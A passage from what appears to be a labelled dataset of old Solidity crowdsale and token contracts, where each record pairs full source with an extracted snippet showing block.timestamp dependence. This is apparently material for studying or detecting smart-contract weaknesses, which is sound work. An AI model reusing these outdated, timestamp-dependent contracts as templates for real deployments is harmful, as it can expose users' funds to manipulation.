lastDay = today();\n }\n uint256 _spentToday = spentToday.add(value);\n if (_spentToday <= dailyLimit) {\n spentToday = _spentToday;\n return true;\n }\n return false;\n }\n function today() private view returns (uint256) {\n return block.timestamp / 1 days;\n }\n function reOrganizeAuthorities() private {\n uint256 free = 1;\n while (free < numAuthorities) {\n while (free < numAuthorities && authorities[free] != 0) {\n free += 1;\n }\n while (numAuthorities > 1 && authorities[numAuthorities] == 0) {\n numAuthorities -= 1;\n }\n if (free < numAuthorities && authorities[numAuthorities] != 0 && authorities[free] == 0) {\n authorities[free] = authorities[numAuthorities];\n authorityIndex[authorities[free]] = free;\n delete authorities[numAuthorities];\n }\n }\n }\n function clearPending() private {\n for (uint256 i = 0; i < pendingOperation.length; i += 1) {\n delete pendingTransaction[pendingOperation[i]];\n }\n delete pendingOperation;\n }\n}",
  "extract_feature": [
    "function today() private view returns (uint256) {\nreturn block.timestamp / 1 days;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee7"
  },
  "filename": "2641.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee8"
  },
  "filename": "2646.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct 